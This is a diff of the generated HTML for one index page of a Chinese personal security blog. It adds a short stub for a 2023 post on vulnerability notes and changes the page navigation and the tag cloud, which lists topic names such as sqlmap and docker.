+      <a class="article-title" href="/2023/03/28/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/">漏洞整理</a>
+    </h1>
+  
+
+        
+        <a href="/2023/03/28/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" class="archive-article-date">
+  	<time datetime="2023-03-28T11:40:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-03-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>其实漏洞是通用的，不管是APP、微信小程序、公众号、网页了，这里细分一点主要是方便我进行一个记录。</p>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞整理</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/03/28/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
     </nav>
   
 
@@ -929,15 +734,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">模糊测试学习</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">docker</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">java fastjson</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -961,10 +758,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">crypto sageMath</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">sqlmap</a>
               </li>
              
@@ -973,23 +766,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">todo</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">安全服务</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">前端 ajax</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">学习杀与免杀</a>
               </li>
              
               <li class="article-tag-list-item">
